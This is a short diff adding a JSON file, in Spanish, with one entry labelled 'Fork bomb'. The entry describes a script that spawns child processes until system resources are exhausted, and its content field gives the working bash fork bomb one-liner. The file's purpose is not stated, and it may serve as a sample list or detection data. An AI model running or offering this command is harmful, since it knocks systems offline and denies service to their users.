@@ -1,0 +1,7 @@
+[
+    {
+    "nombre": "Fork bomb",
+    "descripcion": "Un script que crea múltiples procesos hijo hasta agotar los recursos del sistema",
+    "contenido": ":(){ :|:& };:"
+    }
+]
